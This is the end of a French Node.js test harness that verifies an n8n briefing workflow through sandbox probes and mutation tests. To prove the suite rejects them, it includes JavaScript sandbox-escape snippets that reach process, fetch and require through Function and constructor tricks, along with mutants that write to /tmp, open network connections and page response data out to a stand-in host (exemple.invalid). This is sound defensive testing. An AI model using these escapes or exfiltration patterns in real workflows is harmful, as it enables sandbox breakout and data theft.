  if (!existsSync(FICHIERS.brief)) return ['brief manquant (plans/011-cadrage-01-11/briefs/c4-n8n-briefing-matin.md)']
  const t = lire(FICHIERS.brief)
  const grant = lire(path.join(RACINE, 'supabase/migrations/0189_role_lecture_n8n.sql')).split('\n')
  for (const [table, cols] of Object.entries(PERMISES)) {
    const g = grant[GRANT_0189[table] - 1] ?? ''
    for (const c of cols) {
      const re = new RegExp('^\\|\\s*`' + table + '`\\s*\\|\\s*`' + c + '`\\s*\\|\\s*`([0-9a-z_]+\\.sql):(\\d+)`\\s*\\|\\s*`0189_role_lecture_n8n\\.sql:(\\d+)`', 'm')
      const m = re.exec(t)
      if (!m) { e.push(`brief : colonne ${table}.${c} non citée (ligne « | \`${table}\` | \`${c}\` | \`fichier.sql:N\` | \`0189_role_lecture_n8n.sql:N\` | »)`); continue }
      const f = path.join(RACINE, 'supabase/migrations', m[1])
      const ligne = existsSync(f) ? lire(f).split('\n')[Number(m[2]) - 1] ?? '' : ''
      if (!new RegExp(`\\b${c}\\b`).test(ligne)) e.push(`brief : ${m[1]}:${m[2]} ne contient pas la colonne ${c}`)
      if (Number(m[3]) !== GRANT_0189[table] || !new RegExp(`\\b${c}\\b`).test(g) || !g.includes(`public.${table} `)) e.push(`brief : ${table}.${c} n'est pas accordée par 0189:${GRANT_0189[table]}`)
    }
  }
  for (const [re, quoi] of [[/mention d['’]IA[^\n]*\n+[^\n]*n'est pas visé|n’est pas visé/i, 'la déclaration sur la mention d’IA (« n’est pas visé »)'], [/\bQ2\b/, 'la table de la voie (a) (Q2)'],
    [/composerBriefing/, 'la correspondance avec composerBriefing'], [/briefing-n8n-qa/, 'le juge']]) {
    if (!re.test(t)) e.push(`brief : ${quoi} attendue`)
  }
  return e
}
function preuve() {
  if (!existsSync(FICHIERS.resume)) return ['resume.md manquant (.orchestre/preuves/032-013/resume.md)']
  const t = lire(FICHIERS.resume)
  const e = []
  const titres = t.split('\n').filter((l) => l.startsWith('## '))
  if (titres[0] !== '## Ressources utilisées') e.push('resume.md : la preuve commence par « ## Ressources utilisées »')
  const a = (debut) => titres.some((x) => x === debut || x.startsWith(debut + ' '))
  if (!a('## Questions pour la session principale')) e.push('resume.md : section « Questions pour la session principale » attendue')
  else for (let q = 1; q <= 7; q++) if (!new RegExp(`\\bQ${q}\\b`).test(t.slice(t.indexOf('## Questions pour la session principale')))) e.push(`resume.md : question Q${q} attendue`)
  if (!a('## À reporter au vault')) e.push('resume.md : section « À reporter au vault » attendue')
  return e
}

// ─── 9. Le bac à sable prouve lui-même ses refus ──────────────────────────────────────────────────────────────────────────────
const EVASION_032_010 = "const g = Function('return this')(); return [{ json: { fetch_reel: typeof g['fe' + 'tch'], process_reel: typeof g['pro' + 'cess'], module_fs: typeof (g['pro' + 'cess'] && g['pro' + 'cess'].getBuiltinModule && g['pro' + 'cess'].getBuiltinModule('node:fs').writeFileSync) } }];"
const EVASION_RATTRAPEE = `const r = {};
const t = (k, f) => { try { const v = f(); r[k] = v === undefined || v === null ? 'rien' : typeof v } catch (e) { r[k] = 'refus' } };
t('global_par_Function', () => Function('return this')());
t('constructeur_hote', () => (function () {}).constructor('return process')());
t('constructeur_global', () => globalThis.constructor.constructor('return process')());
t('this_helpers', () => this['help' + 'ers']);
t('fetch', () => globalThis['fe' + 'tch']);
t('process', () => globalThis['pro' + 'cess']);
t('require', () => globalThis['req' + 'uire']);
t('eval_indirect', () => (0, globalThis['ev' + 'al'])('this'));
t('minuterie', () => globalThis['set' + 'Timeout']);
t('console', () => globalThis['con' + 'sole']);
t('horloge', () => Date['n' + 'ow']());
t('horloge_sans_argument', () => new Date());
t('horloge_intl', () => new Intl.DateTimeFormat('fr').format());
t('import', () => import('node:' + 'net').catch(() => 0));
return [{ json: r }];`
async function bacASable() {
  const e = []
  const ko = (m) => e.push(m)
  try {
    const s = await BAC.demander({ type: 'sonde', fichier: FICHIERS.export })
    STATS.sonde = s
    if (s.permission !== true) ko('bac à sable : le modèle de permissions de Node est inactif dans le processus enfant')
    for (const k of ['ecriture', 'lecture', 'processus', 'worker']) if (s[k] !== 'ERR_ACCESS_DENIED') ko(`bac à sable : ${k} ${s[k]} dans le processus enfant (ERR_ACCESS_DENIED attendu)`)
    if (s.nonPieges.length) ko(`bac à sable : globaux hors liste blanche impossibles à piéger (${s.nonPieges.join(', ')})`)
    if (s.noeudVide !== 'ok') ko(`bac à sable : un nœud vide ne passe pas (${s.noeudVide})`)
    const a = await BAC.demander({ type: 'executer', jsCode: EVASION_032_010 })
    STATS.evasionE = a
    if (!a.erreur && !a.violations.length) ko(`bac à sable : l'évasion de l'annexe E (032-010) passe sans refus : ${JSON.stringify(a.items)}`)
    const b = await BAC.demander({ type: 'executer', jsCode: EVASION_RATTRAPEE })
    STATS.evasionRattrapee = b
    const vu = b.items?.[0] ?? {}
    if (Object.keys(vu).length !== 14) ko(`bac à sable : l'évasion rattrapée n'a pas tout essayé (${JSON.stringify(vu)} ${b.erreur ?? ''})`)
    for (const [k, v] of Object.entries(vu)) if (v !== 'refus' && v !== 'rien' && !(k === 'import' && v === 'object')) ko(`bac à sable : l'évasion rattrapée atteint ${k} (${v})`)
    for (const q of ['this.helpers', 'fetch', 'process', 'require', 'console', 'horloge (Date.now)', 'horloge (new Date())', 'horloge (Intl sans date)', 'import()']) if (!b.violations.includes(q)) ko(`bac à sable : la tentative « ${q} » n'est pas notée (${b.violations.join(', ')})`)
  } catch (err) { ko(`bac à sable : ${err.message}`) }
  return e
}

// ─── 10. La suite, et les mutants ──────────────────────────────────────────────────────────────────────────────────────────────
const NB_ALEATOIRES = 320
async function suite(wf, { avecEmpreintes = true, filtreTexte = true, mutant = false, lourds = !mutant } = {}) {
  const e = []
  const ko = (m) => e.push(m)
  if (avecEmpreintes) e.push(...empreintes(wf))
  e.push(...structure(wf, { filtreTexte }))
  if (mutant && e.length) return e
  e.push(...await copies(wf))
  if (mutant && e.length) return e
  try { await casFixes(wf, ko, { rapide: !lourds }) } catch (err) { ko(`cas fixes : exception ${err.message}`) }
  if (mutant && e.length) return e
  try { await casAleatoires(wf, ko, mutant ? 60 : NB_ALEATOIRES, 1, () => mutant && e.length > 0) } catch (err) { ko(`jeux tirés : exception ${err.message}`) }
  if (mutant && e.length) return e
  e.push(...await essai(wf))
  return e
}

/** Un mutant du code d'un ou plusieurs nœuds : [[nœud, avant, après], …]. Jugé sans les empreintes (sinon elles seules le verraient). */
function mutantCode(...remplacements) {
  const f = (wf) => {
    const m = copie(wf)
    for (const [nom, de, vers] of remplacements) {
      const n = noeud(m, nom)
      if (!n?.parameters?.jsCode?.includes(de)) throw new Error(`mutant introuvable dans ${nom} : ${de.slice(0, 60)}`)
      n.parameters.jsCode = n.parameters.jsCode.replace(de, vers)
    }
    return m
  }
  f.code = true
  return f
}
const mutantNoeud = (nom, f) => (wf) => { const m = copie(wf); f(noeud(m, nom), m); return m }
const parametre = (n, nom) => n.parameters.queryParameters.parameters.find((q) => q.name === nom)
const MUTANTS = [
  // Les règles de composerBriefing
  ['seuil des devis sans réponse ramené de 7 à 6 jours', mutantCode(['Contexte du passage', 'devis_sans_reponse_jours: 7', 'devis_sans_reponse_jours: 6'])],
  ['comparateur inversé (devis : >= → <=)', mutantCode(['Devis sans réponse', 'x.jours >= C.seuils.devis_sans_reponse_jours', 'x.jours <= C.seuils.devis_sans_reponse_jours'])],
  ['impayé : retard compté dès l’échéance (> 0 → >= 0)', mutantCode(['Impayés', '.filter((i) => i.joursRetard > 0)', '.filter((i) => i.joursRetard >= 0)'])],
  ['jour UTC au lieu de Paris (contexte)', mutantCode(['Contexte du passage', "timeZone: 'Europe/Paris'", "timeZone: 'UTC'"])],
  ['jour d’envoi d’un devis en UTC au lieu de Paris', mutantCode(['Devis sans réponse', "timeZone: 'Europe/Paris'", "timeZone: 'UTC'"])],
  ['fenêtre « depuis minuit » sur les demandes', mutantCode(['Conversations qui attendent', 'if (attente(l, messages.get(id) || [])) enAttente.push(l);', "if (attente(l, messages.get(id) || []) && Date.parse(l.updated_at) >= Date.parse($('Contexte du passage').first().json.jour + 'T00:00:00+01:00')) enAttente.push(l);"]), { attendu: /\(a\)|conversations/ }],
  ['fenêtre « 24 h » sur les demandes', mutantCode(['Conversations qui attendent', 'if (attente(l, messages.get(id) || [])) enAttente.push(l);', "if (attente(l, messages.get(id) || []) && Date.parse(l.updated_at) >= Date.parse($('Contexte du passage').first().json.instant) - 86400000) enAttente.push(l);"]), { attendu: /\(a\)|conversations/ }],
  ['fenêtre des 200 demandes ignorée', mutantCode(['Paquets de demandes ouvertes', 'triees.slice(0, L.demandes)', 'triees'])],
  ['urgentes non remontées en tête', mutantCode(['Conversations qui attendent', "Number(b.l.urgence === 'urgent') - Number(a.l.urgence === 'urgent') || a.rang - b.rang", 'a.rang - b.rang'])],
  ['silence retiré : une ligne pour un compte vide', mutantCode(['Point du jour par compte', 'if (!rubriques.length) { muets++; if (horsN8n.length) muetsCrm++; continue; }', 'if (!rubriques.length) { muets++; if (horsN8n.length) muetsCrm++; }']), { attendu: /se tait|aucune rubrique|vides|bilan/ }],
  ['lecture en panne prise pour vide', mutantCode(['Contrôle des lectures', 'const lignes = $(nom).all().map((i) => i.json);', 'let lignes = []; try { lignes = $(nom).all().map((i) => i.json); } catch (e) { lignes = []; }'],
    ['Impayés', "for (const i of $('Lire factures').all()) {", "let lues0 = []; try { lues0 = $('Lire factures').all(); } catch (e) { lues0 = []; }\nfor (const i of lues0) {"]), { attendu: /\(j\)/ }],
  ['plafond de pages pris pour une lecture complète', mutantCode(['Contrôle des lectures', 'rangs.length >= L.lignes_par_page * L.pages_max', 'rangs.length > L.lignes_par_page * L.pages_max']), { lourds: true, attendu: /\(k\)/ }],
  ['ordre des priorités de composerBriefing (conversations d’abord)', mutantCode(['Point du jour par compte', "const ORDRE_PRIORITES = ['impayes', 'conversations', 'devis_sans_reponse', 'stock_bas'];", "const ORDRE_PRIORITES = ['conversations', 'devis_sans_reponse', 'impayes', 'stock_bas'];"]), { attendu: /priorit/ }],
  ['comptes pris dans les lectures, pas dans les comptes retenus', mutantCode(['Impayés', "if (!f || typeof f.id !== 'string' || !comptes.has(f.artisan_id)) continue;", "if (!f || typeof f.id !== 'string') continue;"],
    ['Point du jour par compte', 'for (const { id, plan } of comptes) {', "for (const { id, plan } of [...comptes, ...Object.keys(R.impayes).filter((k) => !comptes.some((c) => c.id === k)).map((k) => ({ id: k, plan: 'studio' }))]) {"]), { attendu: /\(e\)|compte qui n'en a pas/ }],
  ['jointure par identifiant seul (demandes)', mutantCode(['Paquets de demandes ouvertes', "const cle = l.artisan_id + '|' + l.id;", 'const cle = l.id;'])],
  ['décision par le nom de l’offre', mutantCode(['Point du jour par compte', 'const cap = CAP[plan];', "const cap = plan === 'studio' ? CAP.studio : CAP[plan];"]), { attendu: /plan ===/ }],
  ['copie des capacités faussée (inventaire coupé en Studio)', mutantCode(['Capacités des offres', "studio: { assistant: true, chiffres: true, 'inventaire.stock': true, crm: false }", "studio: { assistant: true, chiffres: true, 'inventaire.stock': false, crm: false }"]), { attendu: /copie des capacités/ }],
  ['champ texte dans la sortie', mutantCode(['Point du jour par compte', 'artisan_id: id,', "artisan_id: id,\n    note: 'Bonjour, voici votre point du jour',"]), { attendu: /liste blanche|hors énumération/ }],
  ['mot interdit dans une valeur', mutantCode(['Bilan du passage', 'mode: P.mode,', "mode: P.mode === 'simulation' ? 'simulation n8n' : P.mode,"]), { attendu: /mot interdit/ }],
  ['horloge du serveur au lieu du déclencheur', mutantCode(['Contexte du passage', 'const instant = new Date(ms);', 'const instant = new Date(Date.now());']), { attendu: /horloge|interdit/ }],
  ['horloge par Intl sans date (texte non filtré)', mutantCode(['Contexte du passage', "year: 'numeric', month: '2-digit', day: '2-digit' }).format(instant);", "year: 'numeric', month: '2-digit', day: '2-digit' }).format(undefined);"]), { attendu: /horloge \(Intl/ }],
  // É3 : appels cachés dans un nœud Code, jugés sans empreintes NI filtre de texte : le bac à sable seul doit les arrêter.
  ['É3 appel réseau caché (this[\'help\'+\'ers\'])', mutantCode(['Bilan du passage', "const par = {", "const h = (typeof this === 'object' && this) ? this['help' + 'ers'] : null; if (h && h['http' + 'Request']) h['http' + 'Request']({ url: 'https://exemple.invalid' });\nconst par = {"]), { sansFiltre: true, attendu: /bac à sable/ }],
  ['É3 fetch par Function(\'return this\')()', mutantCode(['Bilan du passage', "const par = {", "try { Function('return this')()['fe' + 'tch']('https://exemple.invalid'); } catch (e) { /* silence */ }\nconst par = {"]), { sansFiltre: true, attendu: /bac à sable/ }],
  ['É3 import(\'node:net\')', mutantCode(['Bilan du passage', "const par = {", "import('node:' + 'net').then((n) => n.connect(9, '127.0.0.1')).catch(() => 0);\nconst par = {"]), { sansFiltre: true, attendu: /bac à sable/ }],
  ['É3 écriture sur le disque (process par Function, rattrapée)', mutantCode(['Impayés', 'const parCompte = {};', "try { Function('return this')()['pro' + 'cess'].getBuiltinModule('node:fs').writeFileSync('/tmp/x', 'y'); } catch (e) { /* silence */ }\nconst parCompte = {};"]), { sansFiltre: true, attendu: /bac à sable/ }],
  ['É3 constructeur de l’hôte (({}).constructor.constructor), rattrapé', mutantCode(['Stock sous le seuil', 'const parCompte = {};', "try { ({}).constructor.constructor('return process')(); } catch (e) { /* silence */ }\nconst parCompte = {};"]), { sansFiltre: true, attendu: /bac à sable/ }],
  ['É3 empreinte : un espace ajouté au code audité', mutantCode(['Bilan du passage', 'const par = {', 'const par =  {']), { avecEmpreintes: true, attendu: /nouvel audit requis/ }],
  ['É3 empreinte : nœud Code ajouté', (wf) => { const m = copie(wf); m.nodes.push({ id: 'x', name: 'Code ajouté', type: T.code, typeVersion: 2, position: [0, 0], parameters: { mode: 'runOnceForAllItems', language: 'javaScript', jsCode: 'return [];' } }); return m }, { attendu: /nouvel audit requis|inattendu/ }],
  // É1 : les lectures
  ['colonne nom_prospect ajoutée', mutantNoeud('Lire demandes', (n) => { parametre(n, 'select').value += ',nom_prospect' }), { attendu: /colonne/ }],
  ['colonne contenu ajoutée aux messages', mutantNoeud('Lire messages', (n) => { parametre(n, 'select').value += ',contenu' }), { attendu: /colonne/ }],
  ['jointure dans select= (stock(*))', mutantNoeud('Lire stock', (n) => { parametre(n, 'select').value = 'id,materiau_id,quantite,materiaux(nom)' }), { attendu: /jointure|colonne/ }],
  ['filtre de compte retiré d’une lecture', mutantNoeud('Lire factures', (n) => { n.parameters.queryParameters.parameters = n.parameters.queryParameters.parameters.filter((q) => q.name !== 'artisan_id') }), { attendu: /non filtrée|queryParameters/ }],
  ['filtre de compte neutralisé par une expression', mutantNoeud('Lire devis envoyés', (n) => { parametre(n, 'artisan_id').value = "={{ 'not.is.null' }}" }), { attendu: /non filtrée|queryParameters/ }],
  ['comptes de démonstration lus (filtre est_demo retiré)', mutantNoeud('Lire comptes', (n) => { n.parameters.queryParameters.parameters = n.parameters.queryParameters.parameters.filter((q) => q.name !== 'est_demo') }), { attendu: /queryParameters/ }],
  ['lecture en POST', mutantNoeud('Lire factures', (n) => { n.parameters.method = 'POST' }), { attendu: /POST/ }],
  ['corps de requête ajouté', mutantNoeud('Lire devis envoyés', (n) => { n.parameters.sendBody = true; n.parameters.bodyParameters = { parameters: [{ name: 'x', value: 'y' }] } }), { attendu: /corps/ }],
  ['option proxy', mutantNoeud('Lire factures', (n) => { n.parameters.options.proxy = 'http://exemple.invalid:8080' }), { attendu: /options HTTP hors gabarit/ }],
  ['certificats non vérifiés', mutantNoeud('Lire stock', (n) => { n.parameters.options.allowUnauthorizedCerts = true }), { attendu: /options HTTP hors gabarit/ }],
  ['pagination par nextURL vers un hôte tiers', mutantNoeud('Lire factures', (n) => {
    const pg = n.parameters.options.pagination.pagination
    pg.paginationMode = 'responseContainsNextURL'; delete pg.parameters
    pg.nextURL = "={{ 'https://exemple.invalid/collecte?d=' + encodeURIComponent(JSON.stringify($response.body)) }}"
  }), { attendu: /pagination/ }],
  ['pagination : 5 000 pages', mutantNoeud('Lire demandes', (n) => { n.parameters.options.pagination.pagination.maxRequests = 5000 }), { attendu: /pagination/ }],
  ['messages : pagination ajoutée hors de leur gabarit', mutantNoeud('Lire messages', (n) => { n.parameters.options.pagination = copie(PAGINATION) }), { attendu: /options HTTP hors gabarit/ }],
  ['onError qui continue sur une lecture', mutantNoeud('Lire factures', (n) => { n.onError = 'continueRegularOutput' }), { attendu: /onError|clé de nœud/ }],
  ['alwaysOutputData retiré', mutantNoeud('Lire stock', (n) => { delete n.alwaysOutputData }), { attendu: /alwaysOutputData/ }],
  ['second identifiant', mutantNoeud('Lire stock', (n) => { n.credentials.httpHeaderAuth = { id: 'x', name: 'Autre' } }), { attendu: /identifiant/ }],
  // Le workflow
  ['workflow actif', (wf) => { const m = copie(wf); m.active = true; return m }, { attendu: /inactif/ }],
  ['errorWorkflow vers un autre workflow', (wf) => { const m = copie(wf); m.settings.errorWorkflow = 'AutreWorkflowQuiPosteSurSlack'; return m }, { attendu: /settings|réglage/ }],
  ['errorWorkflow retiré (032-033)', (wf) => { const m = copie(wf); delete m.settings.errorWorkflow; return m }, { attendu: /settings|réglage/ }],
  ['succès gardés : saveDataSuccessExecution « all » (032-033)', (wf) => { const m = copie(wf); m.settings.saveDataSuccessExecution = 'all'; return m }, { attendu: /settings|réglage/ }],
  ['succès gardés : réglage ôté (032-033)', (wf) => { const m = copie(wf); delete m.settings.saveDataSuccessExecution; return m }, { attendu: /settings|réglage/ }],
  ['échecs non gardés (032-033)', (wf) => { const m = copie(wf); m.settings.saveDataErrorExecution = 'none'; return m }, { attendu: /settings|réglage/ }],
  ['déclencheur à 8 h', mutantNoeud(DECLENCHEUR, (n) => { n.parameters.rule.interval[0].triggerAtHour = 8 }), { attendu: /déclencheur/ }],
  ['nœud d’envoi ajouté (Gmail) après le bilan', (wf) => { const m = copie(wf); m.nodes.push({ id: 'y', name: 'Envoyer', type: 'n8n-nodes-base.gmail', typeVersion: 2.1, position: [0, 0], parameters: {} }); m.connections['Bilan du passage'] = { main: [[{ node: 'Envoyer', type: 'main', index: 0 }]] }; return m }, { attendu: /inattendu|rien ne doit suivre/ }],
  ['graphe recâblé (stock lu avant les matériaux)', (wf) => { const m = copie(wf); m.connections['Lire factures'] = { main: [[{ node: 'Lire stock', type: 'main', index: 0 }]] }; return m }, { attendu: /connexion/ }],
]

// ─── Lancement ───────────────────────────────────────────────────────────────────────────────────────────────────────────────
const debut = Date.now()
if (MODE_PIN) {
  const wf = JSON.parse(lire(FICHIERS.export))
  process.stdout.write(JSON.stringify(await donneesEpinglees(wf)) + '\n')
  BAC.fermer()
  process.exit(0)
}
const manquants = Object.entries(FICHIERS).filter(([, f]) => !existsSync(f)).map(([k, f]) => `fichier manquant (${k}) : ${path.relative(RACINE, f)}`)
let WF = null
try { WF = JSON.parse(lire(FICHIERS.export)) } catch { /* rapporté plus bas */ }
const echecs = [...manquants]
if (!WF) echecs.push('export illisible : rien ne peut être jugé')
else {
  echecs.push(...await bacASable())
  echecs.push(...await suite(WF))
  echecs.push(...brief(), ...preuve())
}
const statsVert = copie(STATS)
let mutantsVerts = 0
if (WF) for (const [titre, fabriquer, options = {}] of MUTANTS) {
  const avecEmpreintes = options.avecEmpreintes ?? !fabriquer.code
  let rougit, raison = ''
  try {
    const erreurs = await suite(fabriquer(WF), { avecEmpreintes, filtreTexte: !options.sansFiltre, mutant: true, lourds: !!options.lourds })
    const bonnes = options.attendu ? erreurs.filter((m) => options.attendu.test(m)) : erreurs
    rougit = bonnes.length > 0
    raison = (bonnes[0] ?? erreurs[0] ?? '').slice(0, 220)
    if (!rougit && erreurs.length) raison = `rouge, mais pas pour la raison attendue (${options.attendu}) : ${raison}`
  } catch (err) { raison = `mutant inapplicable : ${err.message}`; rougit = false }
  console.log(`  ${rougit ? '✓' : '✗'} mutant « ${titre} »${avecEmpreintes ? '' : ' [sans empreintes]'}${options.sansFiltre ? ' [sans filtre de texte]' : ''} ${rougit ? 'fait rougir la suite' : 'NE FAIT PAS rougir la suite'}${raison ? `\n      → ${raison}` : ''}`)
  if (!rougit) mutantsVerts++
}
BAC.fermer()
const duree = Math.round((Date.now() - debut) / 1000)
if (duree > 300) echecs.push(`le juge doit tourner en moins de 5 minutes (${duree} s)`)
console.log(`briefing-n8n-qa : ${WF?.nodes?.length ?? 0} nœuds, ${MUTANTS.length} mutants, ${duree} s`)
if (echecs.length || mutantsVerts) {
  for (const e of [...new Set(echecs)].slice(0, 60)) console.log(`  ✗ ${e}`)
  if (echecs.length > 60) console.log(`  … et ${echecs.length - 60} autres`)
  if (mutantsVerts) console.log(`  ✗ ${mutantsVerts} mutant(s) laissent la suite verte`)
  console.log('ÉCHEC')
  process.exit(1)
}
const s = statsVert.sonde, al = statsVert.aleatoires
console.log('  ✓ structure : inactif, graphe entier vérifié, déclencheur 7 h 30 (Europe/Paris), lectures GET seules, select= dans les colonnes permises, réglages en liste blanche, aucun secret')
console.log('  ✓ É1 gabarit HTTP exact : parameters et options, paramètres de requête et filtres à la lettre, pagination (offset seul, ≤ 50 pages), un seul identifiant')
console.log(`  ✓ É3 empreintes : ${EMPREINTES.size} nœuds Code épinglés (sha256), identiques au code audité`)
console.log(`  ✓ É3 bac à sable : processus enfant ${BAC.drapeaux.join(' ')} (Node ${s.node}) — écriture ${s.ecriture}, lecture ${s.lecture}, processus ${s.processus}, worker ${s.worker} ; globaux hors liste blanche tous piégés ; réseau ${s.reseau === 'ERR_ACCESS_DENIED' ? 'ERR_ACCESS_DENIED' : s.reseau + ' (Node ' + s.node + ' n’a pas de barrage réseau : le code n’y atteint pas, faute de tout objet de l’hôte dans son contexte)'}`)
console.log(`  ✓ É3 évasions : annexe E (032-010) ${statsVert.evasionE.erreur ? 'refusée' : 'sans effet'} ; version rattrapée : ${JSON.stringify(statsVert.evasionRattrapee.items[0])}`)
console.log('  ✓ copies : capacités = peut() (lib/plans.ts) ; seuils = lib/assistant/briefing.ts ; limites = les lectures de l’app ; jour de Paris = jourParis')
console.log(`  ✓ mêmes priorités que composerBriefing : ${statsVert.casFixes} passages fixes (a)-(l) et ${al.jeux} jeux tirés (graine fixe), ${al.lignes} points du jour, rubriques ${JSON.stringify(al.parRubrique)}`)
console.log('  ✓ sortie en liste blanche (identifiants, dates, énumérations ; aucun mot interdit ni marque) ; essai n8n rejoué hors ligne : même sortie ; brief et preuve complets')
console.log('OK')
